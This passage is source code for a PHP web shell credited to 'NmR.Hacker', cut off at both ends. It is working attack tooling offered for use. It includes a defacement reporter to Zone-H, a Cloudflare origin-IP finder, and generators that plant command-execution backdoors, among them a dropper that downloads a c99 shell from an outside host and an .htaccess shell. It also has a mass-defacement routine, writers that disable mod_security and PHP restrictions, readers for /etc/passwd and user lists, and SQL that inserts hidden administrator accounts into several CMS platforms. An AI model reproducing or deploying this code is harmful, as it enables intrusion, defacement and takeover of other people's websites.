<option value="31" >Cross-Site Scripting</option>
</select>
<br />
<span>Select The Reason: </span><select name="reason">
<option value="">--------SELECT--------</option>
<option
value="1" >Heh...just for fun!</option>
<option value="2" >Revenge against that website</option>
<option value="3" >Political reasons</option>
<option value="4" >As a challenge</option>
<option value="5" >I just want to be the best defacer</option>
<option value="6" >Patriotism</option>
<option value="7" >Not available</option>
</select><br />
<textarea name="domains" cols="90" rows="20" placeholder="Domains..."></textarea>
<br />
<input type="submit" value="send" />
</form>

</center>
<?php  if(isset($_REQUEST['submit']) && $_REQUEST['submit']=="send") { $defacer= $_REQUEST['defacer']; $hackmode= $_REQUEST['hackmode']; $reason= $_REQUEST['reason']; $domains= $_REQUEST['domains']; $domains_list=explode("\n",$domains); if (empty($defacer)) { die ("<center><b><font color =\"#FF0000\">You Must Fill The Notifier Name</font></b></center>"); } elseif($hackmode == "") { die("<center><b><font color =\"#FF0000\">You Must Select The Method</b></font></center>"); } elseif($reason == "") { die("<center><b><font color =\"#FF0000\">You Must Select The Reason</b></font></center>"); } elseif(empty($domains)) { die("<center><b><font color =\"#FF0000\">You Must Enter The Sites List<font></b></center>"); } for($i=0;$i<count($domains_list);$i++) { if(substr($domains_list[$i], 0, 4) != "http") { $domains_list[$i] = "http://".$domains_list[$i]; } $postVars=array("defacer"=>$defacer,"hackmode"=>$hackmode,"reason"=>$reason,"domain1"=>$domains_list[$i]); $curl = curl_init(); curl_setopt($curl,CURLOPT_RETURNTRANSFER,1); curl_setopt($curl,CURLOPT_URL,'http://www.zone-h.com/notify/single'); curl_setopt($curl,CURLOPT_SSL_VERIFYPEER, FALSE); curl_setopt($curl,CURLOPT_TIMEOUT, 120); curl_setopt($curl,CURLOPT_POST,TRUE); curl_setopt($curl,CURLOPT_POSTFIELDS, $postVars); $a = curl_exec($curl); curl_close($curl); } echo "<pre style=\"margin-top:5px\"><br><center><font color =\"#00A220\"><b>Sending Sites To Zone-H Has Been Completed Successfully !!!</b><font></center>"; } ?>
</div>
        
        <?php  } if($action=="cloudflare"){ ?>
		<br>
<center>
<b>Cloud Flare Bypasser</b>
<form action="?action=cloudflare&dir=<?php echo htmlspecialchars($path);?>" method="post">
<p><br><input type='text' size=30 name='url' placeholder="Site.com">
<input type='submit' name='submit' value='>>' />
</p>
</form>
</center>
		
		<?php  if(isset($_POST['submit']) && $_POST['submit'] == '>>' && isset($_POST['url']) && !empty($_POST['url'])){ function is_ipv4($ip) { return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ? $ip : '(Null)'; } function getipCloudFlare($url){ $url = "http://www.cloudflare-watch.org/cgi-bin/cfsearch.cgi"; $login_data = "cfS=$url"; $login = curl_init(); curl_setopt($login, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0'); curl_setopt($login, CURLOPT_TIMEOUT, 40); curl_setopt($login, CURLOPT_RETURNTRANSFER, 1); curl_setopt($login, CURLOPT_URL, $url); curl_setopt($login, CURLOPT_HEADER, 1); curl_setopt($login, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); curl_setopt($login, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($login, CURLOPT_POST, 1); curl_setopt($login, CURLOPT_POSTFIELDS, $login_data); $content= curl_exec($login); if (preg_match("/<UL><LI>(.*?)<\/UL>/",$content,$find)){ return $find[1]; } else { return 'Error'; } curl_close($login); } $me = $argv[0]; $url = $_POST['url']; if(!preg_match('/^(https?):\/\/(w{3}|w3)\./i', $url)){ $url = preg_replace('/^(https?):\/\//', '', $url); $url = "http://www.".$url; } $headers = get_headers($url, 1); $server = $headers['Server']; $subs = array('cpanel.', 'ftp.', 'server1.', 'cdn.', 'cdn2.', 'ns.', 'ns1.', 'mail.', 'webmail.', 'direct.', 'direct-connect.', 'record.', 'ssl.', 'dns.', 'help.', 'blog.', 'irc.', 'forum.'); $count = count($subs); if(preg_match('/^(https?):\/\/(w{3}|w3)\./i', $url, $matches)) { if($matches[2] != 'www') { $url = preg_replace('/^(https?):\/\//', '', $url); } else { $url = explode($matches[0], $url); $url = $url[1]; } } if(is_array($server)) $server = $server[0]; echo '<pre style="border:2px solid #575757;padding:5px;margin:0;overflow: auto;"><br/>'; if(preg_match('/cloudflare/i', $server)) echo "\n[+] CloudFlare detected: {$server}\n<br>"; else echo "\n[+] CloudFlare wasn't detected, proceeding anyway.\n"; echo '[+] CloudFlare IP: ' . is_ipv4(gethostbyname($url)) . "\n\n<br><br>"; echo "[+] Searching for more IP addresses.\n\n<br><br>"; for($x = 0; $x < $count; $x++) { $site = $subs[$x] . $url; $ip = is_ipv4(gethostbyname($site)); if($ip == '(Null)') continue; echo "Trying {$site}: {$ip}\n<br>"; } echo "\n[+] Finished.\n<br>"; } } if($action=="backdoor"){ echo "<style>#backdoor{background: #000000}</style>"; ?>
        



<br />
<div class="body">

<?php  $list = '<ul class="backdoor">'; if ( !isset($_GET["bd"]) || $_GET["bd"]!=="up" ) { $list .= "<a href=\"?action=backdoor&bd=up&dir=$path\"><li>Upload From Computer Backdoors</li></a>"; } else { $list .= '<li><span>Upload From Computer Backdoors</span></li>'; } if( !isset($_GET["bd"]) || $_GET["bd"]!=="ur" ) { $list .= "<a href=\"?action=backdoor&bd=ur&dir=$path\"><li>Upload From URL Backdoors</li></a>"; } else { $list .= '<li><span>Upload From URL Backdoors</span></li>'; } if( !isset($_GET["bd"]) || $_GET["bd"]!=="ht" ) { $list .= "<a href=\"?action=backdoor&bd=ht&dir=$path\"><li>htaccess Hidden Shell Backdoor</li></a>"; } else { $list .= '<li><span>htaccess Hidden Shell Backdoor</span></li>'; } if ( !isset($_GET["bd"]) || $_GET["bd"]!=="cs" ) { $list .= "<a href=\"?action=backdoor&bd=cs&dir=$path\"><li>CMD shell Backdoor</li></a>"; } else { $list .= '<li><span>CMD shell Backdoor</span></li>'; } echo $list.'</ul>'; ?>

<hr />
<br />
<?php  if(isset($_GET["bd"])){ $bd = $_GET["bd"]; if($bd=="up"){ echo "<form method=\"post\" action=\"?action=backdoor&submit=get&go=up&dir=$path\"><span>Enter Filename create backdoor: </span><br /><input type=\"text\" name=\"filename\"><input type=\"submit\" value=\"Get Backdoor\"></form>"; ?>
<br />
<b><span>Note: This Just Make an uploader not hidden.</span></b>
<?php  } if($bd=="ur"){ echo "<form method=\"post\" action=\"?action=backdoor&submit=get&go=ur&dir=$path\"><span>Enter Filename to add backdoor: </span><br /><input type=\"text\" name=\"filename\"><input type=\"submit\" value=\"Get Backdoor\"></form>"; ?>
<br />
<b><span>How to use ?</span></b>
<p>to use : "site.com/[path]/[file].php?cmd=shell"</p>
<?php  } if($bd=="cs"){ echo "<form method=\"post\" action=\"?action=backdoor&submit=get&go=cs&dir=$path\"><span>Enter Filename to add backdoor: </span><br /><input type=\"text\" name=\"filename\"><input type=\"submit\" value=\"Get Backdoor\"></form>"; ?>
<br />
<b><span>How to use ?</span></b>
<p>to use : "site.com/[path]/[file].php?cmd=[command]"</p>
<?php  } if($bd=="ht"){ echo "<form method=\"post\" action=\"?action=backdoor&submit=get&go=ht&dir=$path\"><input type=\"submit\" value=\"Get htaccess Backdoor\"></form>"; ?>
<br />
<b><span>How to use ?</span></b>
<p>to use : "site.com/[path]/.htaccess?cmd=[command]"</p>
<?php  } } if(isset($_GET["action"]) && $_GET["action"]=="backdoor" && isset($_GET["submit"])=="get" && isset($_GET["go"]) && $_GET["go"]!=""){ $action=htmlspecialchars($_GET["go"]); if($action=="up"){ $code='<?php
if (isset($_FILES["userfile"])) {
$dir=$_POST["dir"];
if($dir == "" || !isset($dir)) $dir=getcwd();


$uploadfile=$dir."/".basename($_FILES["userfile"]["name"]);

if (move_uploaded_file($_FILES["userfile"]["tmp_name"],$uploadfile)) {
echo "Uploaded: ".
"Name: ".$_FILES["userfile"]["name"]."<br>\n".
"Type: ".$_FILES["userfile"]["type"]."<br>\n".
"Size: ".$_FILES["userfile"]["size"]." bytes<br>\n";
}
else print "Error uploading file: ".$_FILES["userfile"]["name"]."";
echo "<hr>";
}
?>

<form enctype="multipart/form-data" method="POST">
Upload New File
<br /><input type="file" name="userfile"/>
<br /><input type="submit" value="Upload"/>
</form>'; $filename = htmlspecialchars($_POST["filename"]); $fp=fopen($filename,'a'); $res = fwrite($fp , $code); fclose($fp); if($res){ echo "<span style='color:green'>ok</span>"; }else{ echo "<span style='color:red'>cant write</span>"; } } if($action=="ur"){ $code = '<?php
//Code By NmR.Hacker 007 ~ Team 007
if(isset($_GET["cmd"]) && $_GET["cmd"]=="shell"){
if(file_put_contents("shell.php", file_get_contents("http://www.sh3ll.org/c99.txt"))){
echo "OK";
} else {
echo "File Cant Be Create";
}
}
//Code By NmR.Hacker 007 ~ Team 007
?>'; $filename = htmlspecialchars($_POST["filename"]); $fp=fopen($filename,'a'); $res = fwrite($fp , $code); fclose($fp); if($res){ echo "<span style='color:green'>ok</span>"; }else{ echo "<span style='color:red'>cant be write</span>"; } } if($action=="ht"){ $code = '<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>
AddType application/x-httpd-php .htaccess
# <?php passthru($_GET["cmd"]); ?>'; $filename = ".htaccess"; $fp=fopen($filename,'a'); $res = fwrite($fp , $code); fclose($fp); if($res){ echo "<span style='color:green'>ok</span>"; }else{ echo "<span style='color:red'>cant be write</span>"; } } if($action=="cs"){ $code = '<?php passthru($_GET["cmd"]); ?>'; $filename = htmlspecialchars($_POST["filename"]); $fp=fopen($filename,'a'); $res = fwrite($fp , $code); fclose($fp); if($res){ echo "<span style='color:green'>ok</span>"; }else{ echo "<span style='color:red'>cant be write</span>"; } } } ?>
</div>
        
        <?php  } if($action=="mass"){ ?>
        
<br />

Mass Defacement:</td><br>
<form action='?action=mass&submit=mass&dir=<?php echo $path ?>' method='post'>
Directory: <input type='text' style='width: 700px' value='<?php echo getcwd() . "/"; ?>' name='massdefacedir'>
<br/>Url Deface Deface Page <input type='text' style='width: 675px' name='massdefaceurl' value=''>
<br/>Name File <input type='text' style='width: 735px' name='filename' value='mahdi.hidden.html'>
<input type='submit' name='execmassdeface' value='Kill It'></form></td>   
        
        <?php  if(isset($_REQUEST['submit']) && $_REQUEST['submit']=="mass"){ echo "<br><span style='margin-left:0px'>Results: </span><br><center><textarea placeholder='Results will be here..' rows='15' cols='100'>"; $defaceurl = htmlspecialchars($_POST['massdefaceurl']); $dir = htmlspecialchars($_POST['massdefacedir']); $filename = htmlspecialchars($_POST['filename']); echo $dir."\n"; if (is_dir($dir)) { if ($dh = opendir($dir)) { while (($file = readdir($dh)) !== false) { if(filetype($dir.$file)=="dir"){ $newfile=$dir.$file."/".$filename; echo $newfile."\n"; if (!copy($defaceurl, $newfile)) { echo "failed to copy $file...\n"; } } } closedir($dh); } } echo "</textarea></center>"; } ?>
        
        <?php  } if($action=="disfunc"){ ?>
     	<br />
        <center>
        <table>
        <tr><td>
          <form action="?action=disfunc&submit=bypass&bypass=apache&dir=<?php echo $path ?>" method="post">
          <input type="submit" value="htaccess apache" />
          </form>
                    
		</td><td>
        
		 <form action="?action=disfunc&submit=bypass&bypass=litespeed&dir=<?php echo $path ?>" method="post">
		<input type="submit" value="htaccess litespeed" />          
        </form>
        </td><td>
        <form action="?action=disfunc&submit=bypass&bypass=phpini&dir=<?php echo $path ?>" method="post">
		<input type="submit" value="php.ini" />          
        </form>
          </td>
		  <td>
          <form action="?action=disfunc&submit=bypass&bypass=etcpasswd&dir=<?php echo $path ?>" method="post">
          <input type="submit" value="Read etc/passwd" />
          </form>
                    
		</td>
		<td>
          <form action="?action=disfunc&submit=bypass&bypass=readusers&dir=<?php echo $path ?>" method="post">
          <input type="submit" value="Read Users" />
          </form>
                    
		</td></tr>
          </table>
          </center>
          <?php  if(isset($_REQUEST['submit']) && $_REQUEST['submit']=="bypass"){ $bypass = $_REQUEST['bypass']; if($bypass=="apache"){ ?>
                 
                 <?php  $fil=fopen($path."/".".htaccess","w"); fwrite($fil,'#Generated By NmR.Hacker.Team 007
<IfModule mod_security.c>
Sec------Engine Off
Sec------ScanPOST Off
</IfModule>'); fclose($fil); echo '<script>alert("htaccess for Apache is created...!")</script>'; ?>
                 <?php  } elseif($bypass=="phpini"){ ?>
                <?php  $fil=fopen($path."/"."php.ini","w"); fwrite($fil,'safe_mode=OFF
disable_functions=ByPass By NmR.Hacker.Team 007'); fclose($fil); $file2=fopen($path."/"."ini.php","w"); fwrite($file2,'<?php
echo ini_get("safe_mode");
echo ini_get("open_basedir");
include($_GET["file"]);
ini_restore("safe_mode");
ini_restore("open_basedir");
echo ini_get("safe_mode");
echo ini_get("open_basedir");
include($_GET["ss"]);
?>'); fclose($file2); echo '<script>alert("php.ini && ini.php is created...!")</script>'; ?>

			  }<?php  } elseif($bypass=="litespeed"){ ?>
                  <?php  $fil=fopen($path."/".".htaccess","w"); fwrite($fil,'#Generated By NmR.Hacker.Team 007
<Files *.php>
ForceType application/x-httpd-php4
</Files>
ahm tas: <IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>'); fclose($fil); echo '<script>alert("htaccess for Litespeed is created...!")</script>'; ?>
                  <?php  } elseif($bypass=="etcpasswd"){ echo '<br><pre style="border:2px solid #575757;padding:5px;margin:0;overflow: auto;">'; if(function_exists("system") || function_exists("exec") || function_exists("passthru") || function_exists("shell_exec")){ echo extension("cat /etc/passwd"); } elseif(function_exists("file_get_contents") && is_readable("/etc/passwd")){ echo file_get_contents("/etc/passwd"); } elseif(function_exists("posix_getpwuid")){ for($uid=0;$uid<60000;$uid++){ $ara = @posix_getpwuid($uid); if (!empty($ara)) { while (list ($key, $val) = each($ara)){ print "$val:"; }print "\n";}} } else{echo '<script>alert("Error in bypass...")</script>';} } elseif($bypass=="readusers"){ if(!@file_exists("/etc/virtual/domainowners")){ echo '<br><pre style="border:2px solid #575757;padding:5px;margin:0;overflow: auto;">'; $i = 0; while ($i < 60000) { $line = posix_getpwuid($i); if (!empty($line)) { while (list ($key, $vl) = each($line)){ echo $vl."\n"; break;}}$i++;} }else{echo '<pre style="border:2px solid #575757;padding:5px;margin:0;overflow: auto;"><br>'; $users = @file("/etc/virtual/domainowners"); foreach($users as $boz){ $user = explode(":",$boz); echo trim($user[1]).'<br>';}} } } ?>
        
        <?php  } if($action=="info"){ ?>
        
        <br />
        <?php  echo '<div class=phpinfo><style>.p {color:#000;}</style>'; ob_start(); phpinfo(); $tmp = ob_get_clean(); $tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2, hr) {.*}!msiU','',$tmp); $tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp); echo str_replace('<h1','<h2', $tmp) .'</div><br>'; ?>
      
        <?php  } if($action=="aboutus"){ echo "<style>#aboutus{background: #000000}</style>"; ?>
        <br />
                    <center>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Coat_of_arms_of_Kuwait.svg/180px-Coat_of_arms_of_Kuwait.svg.png" /><br />
   		<span style="color:#F00;font-size:20px">NmR.Hacker</span><br />
                        <span style="font-size:19px">Developed By <a target="_blank" href="http://instgram.com/_q8y">NmR.Hacker</a></span><br />
                        <span style="font-size:19px">Zone-H <a target="_blank" href="http://www.zone-h.org/archive/notifier=NmR.Hacker">NmR.Hacker</a></span><br />

        <span>skype T8@Hotmail.Com</span><br />
        <span>Our Residence: <a href="http://instgram.com/_q8y" target="_blank">NmR.Hacker</a><br />
        <span><br>403</span><br />
                    </center>
        <?php  } if($action=="rmshell"){ echo "<style>#rmshell{background: #000000}</style>"; ?>
        
        <form action="?action=rmshell" method="post">
        <span>Do You Really Want To Remove Sheller?</span>
            <input type="submit" value="Yes" name="accept" style="cursor: pointer"/>
            <input type="button" value="No" onclick="window.location.href='?action=explorer'" style="cursor: pointer"/>
        </form>
        
	<?php  if(isset($_POST['accept']) && $_POST['accept'] != "" && $_POST['accept']=="Yes"){ if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__))) die('<b>Sheller has been removed</i> :)</b>'); else echo 'unlink error!'; } } if($action=="pwchanger"){ ?>
<center>
<br>
<div class="pwchanger">
<a href="?action=pwchanger&cms=wp"><input type="button" value="Wordpress"></a>
<a href="?action=pwchanger&cms=joomla"><input type="button" value="Joomla"></a>
<a href="?action=pwchanger&cms=vb"><input type="button" value="vBulletin"></a>
<a href="?action=pwchanger&cms=whmcs"><input type="button" value="WHMCS"></a>
<a href="?action=pwchanger&cms=mybb"><input type="button" value="MyBB"></a>
<a href="?action=pwchanger&cms=phpbb"><input type="button" value="phpBB"></a>
<a href="?action=pwchanger&cms=phpnuke"><input type="button" value="phpNuke"></a>
</div>
</center>
<?php  if(isset($_GET['cms']) && $_GET['cms']!=""){ $cms=$_GET['cms']; if($cms=="wp"){ ?>
<br>
<b>ADD NEW ADMIN WORDPRESS</b>
<form action="?action=pwchanger&cms=wp" method="POST">
<table>
<tr><td>Host :</td>
<td><input size="30" value="localhost" name="localhost" type="text"></td></tr>
<tr><td>Database :</td>
<td> <input size="30" value="" name="database" type="text"></td></tr>
<tr><td>Table Prefix :</td>
<td><input size="30" value="wp_" name="prefix" type="text"></td></tr>
<tr><td>Username : </td>
<td> <input size="30" value="" name="username" type="text"></td></tr>
<tr><td>Password :</td>
<td> <input size="30" value="" name="password" type="text"></td></tr>
<tr><td>Admin Username:</td>
<td><input name="admin" size="30" value="admin"></td></tr>
<tr><td>Admin Password: </td>
<td><input name="pass" size="30" value="NmR.Hacker" disabled /></td></tr>
<tr><td><Admin Email:</td>
<td><input name="email" size="30" value="ddoshacker3@gmail.com"></td></tr>
</table>
<input value="Change" name="submit" type="submit">
</form>


<?php  if (isset($_POST['submit']) && $_POST['submit'] == 'Change'){ $localhost = $_POST['localhost']; $database = $_POST['database']; $username = $_POST['username']; $password = $_POST['password']; $admin = $_POST['admin']; $email = $_POST['email']; $prefix = $_POST['prefix']; @mysql_connect($localhost,$username,$password) or die(mysql_error()); @mysql_select_db($database) or die(mysql_error()); $result=@mysql_query("insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','dfcaf717b6731a6f62baabad524a8517','$email')") or die(mysql_error()); $result=@mysql_query("select ID from ".$prefix."users where user_login='".$admin."'") or die(mysql_error()); $res = mysql_num_rows($result); if ($res == 1){ $resvis = mysql_fetch_assoc($result); $res = $resvis['ID']; } $result=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','first_name','result')") or die(mysql_error()); $result=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','last_name','result')") or die(mysql_error()); $result=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','nickname','result')") or die(mysql_error()); $result=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','description','result')") or die(mysql_error()); $result=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','rich_editing','true')") or die(mysql_error()); $result=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','comment_shortcuts','false')") or die(mysql_error()); $result=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','admin_color','fresh')") or die(mysql_error()); $result=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','use_ssl','0')") or die(mysql_error()); $result=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','show_admin_bar_front','true')") or die(mysql_error()); $result=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','wp_capabilities','a:1:{s:13:\"administrator\";b:1;}')") or die(mysql_error()); $result=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','wp_user_level','10')") or die(mysql_error()); $result=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','dismissed_wp_pointers','wp330_toolbar,wp330_saving_widgets,wp340_choose_image_from_library,wp340_customize_current_theme_link,wp350_media')") or die(mysql_error()); $result=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','show_welcome_panel','1')") or die(mysql_error()); $result=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','wp_dashboard_quick_press_last_post_id','3')") or die(mysql_error()); if($result){ echo "<center><br><b><script>alert('".$admin." is created successfully.')</script></b></center> "; } } } if($cms=="joomla"){ ?>
<br>
<b>ADD NEW ADMIN JOOMLA</b>
<form action="?action=pwchanger&cms=joomla" method="POST">
<table>
<tr><td>Host :</td>
<td><input size="30" value="localhost" name="localhost" type="text"></td></tr>
<tr><td>Database :</td>
<td> <input size="30" value="" name="database" type="text"></td></tr>
<tr><td>Table Prefix :</td>
<td><input size="30" value="jos_" name="prefix" type="text"></td></tr>
<tr><td>Username : </td>
<td> <input size="30" value="" name="username" type="text"></td></tr>
<tr><td>Password :</td>
<td> <input size="30" value="" name="password" type="text"></td></tr>
<tr><td>Admin Username:</td>
<td><input name="admin" size="30" value="admin"></td></tr>
<tr><td>Admin Password: </td>
<td><input name="pass" size="30" value="NmR.Hacker" disabled /></td></tr>
<tr><td>Admin Email:</td>
<td><input name="email" size="30" value="ddoshacker3@gmail.com"></td></tr>
</table>
<input value="Change" name="submit" type="submit">
</form>

<?php  if (isset($_POST['submit']) && $_POST['submit'] == 'Change'){ $localhost = $_POST['localhost']; $database = $_POST['database']; $username = $_POST['username']; $password = $_POST['password']; $admin = $_POST['admin']; $email = $_POST['email']; $prefix = $_POST['prefix']; @mysql_connect($localhost,$username,$password) or die(mysql_error()); @mysql_select_db($database) or die(mysql_error()); $result=@mysql_query("insert into ".$prefix."users (id,name,username,email,password) values(null,'Super User','".$admin."','".$email."','dfcaf717b6731a6f62baabad524a8517')") or die(mysql_error()); $result=@mysql_query("select id from ".$prefix."users where username='".$admin."'") or die(mysql_error()); $res = mysql_num_rows($result); if ($res == 1){ $resvis = mysql_fetch_assoc($result); $res = $resvis['id']; } $result=@mysql_query("INSERT INTO ".$prefix."user_usergroup_map (user_id,group_id) VALUES ('".$res."', '8')") or die(mysql_error()); if($result){ echo "<center><br><b><script>alert('".$admin." is created successfully.')</script></b></center> "; } } } if($cms=="vb"){ ?>
	<br>
	<b>ADD NEW ADMIN VBULLETIN</b>
<form action="?action=pwchanger&cms=vb" method="POST">
<table>
<tr><td>Host :</td>
<td><input size="30" value="localhost" name="localhost" type="text"></td></tr>
<tr><td>Database :</td>
<td> <input size="30" value="" name="database" type="text"></td></tr>
<tr><td>Table Prefix :</td>
<td><input size="30" value="" name="prefix" type="text"></td></tr>
<tr><td>Username : </td>
<td> <input size="30" value="" name="username" type="text"></td></tr>
<tr><td>Password :</td>
<td> <input size="30" value="" name="password" type="text"></td></tr>
<tr><td>Admin Username:</td>
<td><input name="admin" size="30" value="admin"></td></tr>
<tr><td>Admin Password: </td>
<td><input name="pass" size="30" value="NmR.Hacker" disabled /></td></tr>
<tr><td>Admin Email:</td>
<td><input name="email" size="30" value="ddoshacker3@gmail.com"></td></tr>
</table>
<input value="Change" name="submit" type="submit">
</form>
<?php  if (isset($_POST['submit']) && $_POST['submit'] == 'Change'){ $localhost = $_POST['localhost']; $database = $_POST['database']; $username = $_POST['username']; $password = $_POST['password']; $admin = $_POST['admin']; $email = $_POST['email']; $prefix = $_POST['prefix']; @mysql_connect($localhost,$username,$password) or die(mysql_error()); @mysql_select_db($database) or die(mysql_error()); $result=@mysql_query("insert into {$prefix}user (userid,usergroupid,username,password,salt,email) values(null,'6','$admin','efacb3b2c13f0363459bffe5d6f30631','Xw|IbGLhTQA-AwApVv>61y^(z]*<QN','$email')") or die(mysql_error()); $result=@mysql_query("select userid from {$prefix}user where username='".$admin."'") or die(mysql_error()); $res = mysql_num_rows($result); if ($res == 1){ $resvis = mysql_fetch_assoc($result); $res = $resvis['userid']; } $result=@mysql_query("insert into {$prefix}administrator (userid,adminpermissions) values('".$res."','16744444')") or die(mysql_error()); if($result){ echo "<center><br><b><script>alert('".$admin." is created successfully.')</script></b></center> "; } } } if($cms=="phpbb"){ ?>
<br>
<b>ADD NEW ADMIN PHPBB</b>
<form action="?action=pwchanger&cms=phpbb" method="POST">
<table>
<tr><td>Host :</td>
<td><input size="30" value="localhost" name="localhost" type="text"></td></tr>
<tr><td>Database :</td>
<td> <input size="30" value="" name="database" type="text"></td></tr>
<tr><td>Table Prefix :</td>
<td><input size="30" value="" name="prefix" type="text"></td></tr>
<tr><td>Username : </td>
<td> <input size="30" value="" name="username" type="text"></td></tr>
<tr><td>Password :</td>
<td> <input size="30" value="" name="password" type="text"></td></tr>
<tr><td>Admin Username:</td>
<td><input name="admin" size="30" value="admin"></td></tr>
<tr><td>Admin Password: </td>
<td><input name="pass" size="30" value="NmR.Hacker" disabled /></td></tr>
<tr><td>Admin Email:</td>
<td><input name="email" size="30" value="ddoshacker3@gmail.com"></td></tr>
</table>
<input value="Change" name="submit" type="submit">
</form>

<?php  if (isset($_POST['submit']) && $_POST['submit'] == 'Change'){ $localhost = $_POST['localhost']; $database = $_POST['database']; $username = $_POST['username']; $password = $_POST['password']; $admin = $_POST['admin']; $pass = $_POST['pass']; $email = $_POST['email']; $prefix = $_POST['prefix']; $hash = md5($pass); @mysql_connect($localhost,$username,$password) or die(mysql_error()); @mysql_select_db($database) or die(mysql_error()); $result=@mysql_query("UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE username_clean = 'admin'") or die(mysql_error()); $result=@mysql_query("UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE username_clean = 'admin'") or die(mysql_error()); $result=@mysql_query("UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE user_type = 3") or die(mysql_error()); $result=@mysql_query("UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE user_type = 3") or die(mysql_error()); $result=@mysql_query("UPDATE ".$prefix."users SET user_email ='".$SQL."' WHERE username_clean = 'admin'") or die(mysql_error()); if($result){ echo "<center><br><b><script>alert('".$admin." is created successfully.')</script></b></center> "; } } } if($cms=="whmcs"){ ?>
	<br>
	<b>ADD NEW ADMIN WHMCS</b>
<form action="?action=pwchanger&cms=whmcs" method="POST">
<table>
<tr><td>Host :</td>
<td><input size="30" value="localhost" name="localhost" type="text"></td></tr>
<tr><td>Database :</td>
<td> <input size="30" value="" name="database" type="text"></td></tr>
<tr><td>Username : </td>
<td> <input size="30" value="" name="username" type="text"></td></tr>
<tr><td>Password :</td>
<td> <input size="30" value="" name="password" type="text"></td></tr>
<tr><td>Admin Username:</td>
<td><input name="admin" size="30" value="admin"></td></tr>
<tr><td>Admin Password: </td>
<td><input name="pass" size="30" value="NmR.Hacker" disabled /></td></tr>
<tr><td>Admin Email:</td>
<td><input name="email" size="30" value="ddoshacker3@gmail.com"></td></tr>
</table>
<input value="Change" name="submit" type="submit">
</form>
	
	<?php  if (isset($_POST['submit']) && $_POST['submit'] == 'Change'){ $localhost = $_POST['localhost']; $database = $_POST['database']; $username = $_POST['username']; $password = $_POST['password']; $admin = $_POST['admin']; $email = $_POST['email']; @mysql_connect($localhost,$username,$password) or die(mysql_error()); @mysql_select_db($database) or die(mysql_error()); $result=@mysql_query("insert into tbladmins (id,roleid,username,password,email,template,homewidgets) values(null,'1','".$admin."','dfcaf717b6731a6f62baabad524a8517','".$email."','blend','getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|')") or die(mysql_error()); if($result){ echo "<center><br><b><script>alert('".$admin." is created successfully.')</script></b></center> "; } } } if($cms=="mybb"){ ?>
<br>
<b>ADD NEW ADMIN MYBB</b>
<form action="?action=pwchanger&cms=mybb" method="POST">
<table>
<tr><td>Host :</td>
<td><input size="30" value="localhost" name="localhost" type="text"></td></tr>
<tr><td>Database :</td>
<td> <input size="30" value="" name="database" type="text"></td></tr>
<tr><td>Table Prefix :</td>
<td><input size="30" value="" name="prefix" type="text"></td></tr>
<tr><td>Username : </td>
<td> <input size="30" value="" name="username" type="text"></td></tr>
<tr><td>Password :</td>
<td> <input size="30" value="" name="password" type="text"></td></tr>
<tr><td>Admin Username:</td>
<td><input name="admin" size="30" value="admin"></td></tr>
<tr><td>Admin Password: </td>
<td><input name="pass" size="30" value="NmR.Hacker" disabled /></td></tr>
<tr><td>Admin Email:</td>
<td><input name="email" size="30" value="ddoshacker3@gmail.com"></td></tr>
</table>
<input value="Change" name="submit" type="submit">
</form>

<?php  if (isset($_POST['submit']) && $_POST['submit'] == 'Change'){ $localhost = $_POST['localhost']; $database = $_POST['database']; $username = $_POST['username']; $password = $_POST['password']; $admin = $_POST['admin']; $email = $_POST['email']; $prefix = $_POST['prefix']; @mysql_connect($localhost,$username,$password) or die(mysql_error()); @mysql_select_db($database) or die(mysql_error()); $result=@mysql_query("insert into ".$prefix."users (uid,username,password,salt,email,usergroup) values(null,'".$admin."','c93bfab2a4d210f8cbf8bc0fcfbba67b','ywza68lS','".$email."','4')") or die(mysql_error()); if($result){ echo "<center><br><b><script>alert('".$admin." is created successfully.')</script></b></center> "; } } } if($cms=="phpnuke"){ ?>
	<br>
	<b>ADD NEW ADMIN PHP NUKE</b>
	<form action="?action=pwchanger&cms=phpnuke" method="POST">
<table>
<tr><td>Host :</td>
